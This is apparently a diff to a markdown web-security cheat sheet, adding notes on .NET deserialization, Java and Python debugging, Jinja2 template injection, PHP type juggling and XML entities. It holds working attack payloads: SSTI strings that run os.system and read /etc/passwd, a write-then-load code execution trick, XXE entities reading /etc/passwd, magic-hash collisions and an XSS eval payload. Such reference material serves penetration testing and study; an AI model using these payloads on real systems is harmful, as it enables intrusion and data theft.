@@ -4,6 +4,43 @@
 - Brainfuck Interpreter: https://sange.fi/esoteric/brainfuck/impl/interp/i.html
 - Piet Interpreter: https://www.bertnase.de/npiet/npiet-execute.php
 
+## .Net
+
+- Compiling `cs` files: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe test.cs`
+- Enabling debug:
+  - Src in `C:\inetpub\wwwwroot\eample\bin\example.dll` is loaded to `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\example\`
+  - dnSpy (Edit Assembly Attributes (C#))
+    - Making an Image Easier to Debug: <https://github.com/dnSpy/dnSpy/wiki/Making-an-Image-Easier-to-Debug>
+    - From: `[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]`
+    - To: `[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]`
+  - Compile and Save Module
+  - Debug > Attach  w3wp.exe
+  - Pause
+  - Debug > Windows > Modules
+  - Right Click - Open All Modules
+- Deserialization
+  - Ref:
+    - <https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf>
+    - <https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf> 
+  - <https://github.com/pwntester/ysoserial.net>
+  - System.Windows.Data.ObjectDataProvider <https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN&view=netframework-4.7.2>
+    - Inherits DataSourceProvider
+    - PresentationFramework.dll  (C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF)
+    - Wrap an arbitrary object
+    - use the MethodName property to call a method
+    - use the MethodParameters property to pass parameters
+  - BinaryFormatter - Serializes and deserializes an object, or an entire graph of connected objects, in binary format <https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netcore-3.1&viewFallbackFrom=netframework-%204.7.2>
+    - BinaryFormatter is insecure and can't be made secure.
+    - BinaryFormatter security guide: <https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide>
+  - XML serialization: <https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization>
+  - ObjectDataProvider: <https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=netcore-3>
+    - Use the ConstructorParameters property to pass parameters to the constructor of your object.
+    - Use the MethodName property to call a method and use the MethodParameters property to pass parameters to the method. You can then bind to the results of the method.
+  - ExpandedWrapper: <https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2?view=netframework-4.7.2>
+    - <https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs>
+    - <https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations>
+    - <http://oakleafblog.blogspot.com/2010/07/windows-azure-and-cloud-computing-posts_22.html>
+
 ## C / C++
 
 - Unsafe functions 
@@ -24,6 +61,30 @@
 
 
 ## Java
+
+- Simple steps to create Jar
+    ```bash
+    javac -source 1.8 -target 1.8 test.java
+    mkdir META-INF
+    echo "Main-Class: test" > META-INF/MANIFEST.MF
+    jar cmvf META-INF/MANIFEST.MF test.jar test.class
+    java -jar test.jar
+    ```
+- Debug
+    ```bash
+    -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=8787,server=y ,suspend=n
+    jdb -attach example:8787
+    jdb -sourcepath . -attach example:8787 # jdb with the sourcepath
+    stop in <full package>.<class>.<method>
+    list
+
+    # add to tomcat-verison/bin/startup.sh
+    export JPDA_ADDRESS=8000
+    export JPDA_TRANSPORT=dt_socket
+
+    # modify last line to
+    exec "$PRGDIR"/"$EXECUTABLE" jpda start "$@"
+    ```
 
 **References**
 
@@ -49,7 +110,9 @@
 <img src="x/><script>eval(String.fromCharCode(CHARCODE_HERE));</script>">
 ```
 
-## NodeJS
+## NodeJS / JavaScript
+
+- Look for `eval()`
 
 **Tools**
 
@@ -58,6 +121,8 @@
 
 **References**
 
+- Eval Safe-Eval VM VM2: <https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/>
+  - <https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html>
 - [Exploiting deserialization bugs in Node.js modules for Remote Code Execution](https://ajinabraham.com/blog/exploiting-deserialization-bugs-in-nodejs-modules-for-remote-code-execution)
   - [Exploiting Node.js deserialization bug for Remote Code Execution](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
 - [Node.js Security: Pentesting and Exploitation – NJS](https://opsecx.com/index.php/product/node-js-security-pentesting-and-exploitation/)
@@ -84,6 +149,67 @@
 - Fearless Concurrency with Rust: <https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html>
 
 ## Python
+
+- Internals: Objects, Classes and Metaclasses - Above and Under the Hood: <http://cben-hacks.sourceforge.net/python/lectures/metaclasses/metaclasses.html>
+  - <https://blog.usejournal.com/playing-with-inheritance-in-python-73ea4f3b669e>'
+  - Type vs Object: <https://lerner.co.il/2015/10/18/pythons-objects-and-classes-a-visual-guide/>
+  - Script to inspect: <https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py>
+- Debugging using ptvsd
+  - `pip install ptvsd`
+  - If `Procfile` is used disable start of web server automatically by commenting `web:` section
+  - Add following to app:
+    ```python
+    import ptvsd
+    ptvsd.enable_attach(redirect_output=True)
+    print("Waiting for debugger")
+    ptvsd.wait_for_attach()
+    ```
+- Get attributes and methods of a object:
+    ```python
+    s = 'HELLO'
+    dir(s)
+    ```
+- `__class__` attribute - type of object
+- `__mro__` attribute (Method Resolution Order)) - tuple of classes in the search order
+- `__subclasses__` returns a list of all the subclasses of a class
+- `__bases__` provides a tuple of immediate base classes of a class.
+
+**SSTI**
+
+- <https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti>
+- <https://0day.work/jinja2-template-injection-filter-bypasses/>
+- SSTI patterns: 
+  - `s.__class__.__base__.__subclasses__()`
+  - `s.__class__.__mro__[1].__subclasses__()`
+
+- Searching:
+```python
+c = 'HELLO'.__class__.__base__.__subclasses__()
+
+for i in range(len(c)):
+  print( i, c[i].__name__ )
+
+for i in range(len(c)):
+  n = c[i].__name__
+  if n.find('warning') > -1: # Find specific function name
+    print( i, n )
+```
+
+- Common interesting functions:  
+  - catch_warnings: `s.__class__.__base__.__subclasses__()[100]._module.__builtins__['__import__']('os').system("date")`
+  - read: `s.__class__.__base__.__subclasses__()[100]('/etc/passwd').read()`
+  - popen: `s.__class__.__base__.__subclasses__()[100](["/usr/bin/touch","/tmp/example"])`
+- Common sinks:
+  - `flask.render_template_string(source, **context)`
+- Vars:
+  - `request`
+  - `session`
+  - `config`
+  - `g` - globals
+  - May bruteforce with <https://raw.githubusercontent.com/albinowax/SecLists/9309803f3f7d5c1e0b2f26721c1ea7ef36eeb1c8/Discovery/Web_Content/burp-parameter-names>
+  - <https://flask.palletsprojects.com/en/1.0.x/templating/#standard-context>
+  - <https://jinja.palletsprojects.com/en/master/templates/#builtin-globals>
+- First, inject something like {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('<malicious code here>'') }} into the SSTI vulnerability. Then, invoke the compilation process by injecting {{ config.from_pyfile('/tmp/owned.cfg') }}. The code will execute upon compilation. <https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/>
 
 **Challenges**
 
@@ -154,6 +280,8 @@ print('POST {} {}'.format(r.status_code, r.url))
 ```
 
 ## PHP
+
+- Extensions: `.php .php3 .php4 .php5 .php7 .phps .phtml .inc .phar`
 
 ### Cheatsheets
 
@@ -274,6 +402,7 @@ Bypass: $string = "`ls -lah`";
 
 #### Type Juggling
 
+Fixed in v7 (except for exponent)
 References:
 
 - <https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf>
@@ -324,6 +453,38 @@ Example:
 $COOKIE[‘token’] == $token (‘0e124656823434657657655654324342’ == ‘0’) will return TRUE
 $COOKIE[‘token’] != $token (‘0e124656823434657657655654324342’ != ‘0’) will return FALSE
 ```
+```php
+var_dump(md5('240610708') == md5('QNKCDZO'));
+var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
+var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
+var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
+var_dump('0010e2'         == '1e3');
+var_dump('0x1234Ab'       == '1193131');
+var_dump('0xABCdef'       == '     0xABCdef');
+```
+MD5
+```php
+var_dump(md5('240610708') == md5('QNKCDZO'));
+0e462097431906509019562988736854 == 0e830400451993494058024219903391
+```
+SHA1
+```
+0e07766915004133176347055865026311692244
+```
+
+```python
+def find_email_with_juggle_md5(domain, max_prefix_length, hash_split_length):
+    count = 0
+    for check in itertools.imap(''.join, itertools.product(string.lowercase, repeat=int(max_prefix_length))):
+        hash = hashlib.md5("%s@%s" % (check, domain)).hexdigest()
+        if hash_split_length > 0:
+            hash =  hash[:hash_split_length]
+        if re.match(r'0+[eE]\d+$', hash):
+            print "(+) Found %s@%s, with  %d attempts (hash: %s)" % (check, domain, count, hash)
+    count += 1
+```
+
+- <https://www.whitehatsec.com/blog/magic-hashes/>
 
 #### Reduction in Entropy (Insecure HMAC)
 
@@ -339,3 +500,54 @@ Given 240610708 and QNKCDZO attacker can guess that hashing algo is `md5`
 ```php
 var_dump(md5('240610708') == md5('QNKCDZO')); ===> TRUE
 ```
+
+## XML
+
+- Internal entity: `<!ENTITY name "entity_value">`
+  - `<!ENTITY test "<value>test</value>">`
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE data [
+    <!ELEMENT data ANY >
+    <!ENTITY name "Replaced">
+    ]>
+    <root>
+        <t1>&name;</t1>
+    </root>
+    ```
+- External entity: 
+  - Private: `<!ENTITY name SYSTEM "URI">`
+    - `<!ENTITY example SYSTEM "http://example.com/example.xml">`
+  - Public: `<!ENTITY name PUBLIC "public_id" "URI">`
+    - `<!ENTITY example PUBLIC "-//W3C//TEXT examples//EN" "http://example.com/example.xml">`
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE data [
+    <!ELEMENT data ANY >
+    <!ENTITY name SYSTEM "file:///etc/passwd">
+    ]>
+    <root>
+        <t1>&name;</t1>
+    </root>
+    ```
+- Parameter Entity: `<!ENTITY % name SYSTEM "URI">`
+  - `<!ENTITY % test 'Example'><!ENTITY Title 'This is %test;' >`
+- Unparsed:
+  - `<!ENTITY name SYSTEM "URI" NDATA TYPE>`
+  - `<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>`
+- CDATA
+  - It's not possible to ref to entity from another entity within the DTD defining those
+  - Hence, need external DTD: `echo '<!ENTITY wrapper "%start;%content;%end;">' > wrapper.dtd`
+    ```xml
+    <?xml version="1.0"?>
+    <!DOCTYPE data [
+    <!ENTITY % start "<![CDATA[">
+    <!ENTITY % content SYSTEM "file:///example/example.xml" >
+    <!ENTITY % end "]]>">
+    <!ENTITY % dtd SYSTEM "http://example/wrapper.dtd" >
+    %dtd;
+    ]>
+    <root>
+        <t1>&wrapper;</t1>
+    </root>
+    ```
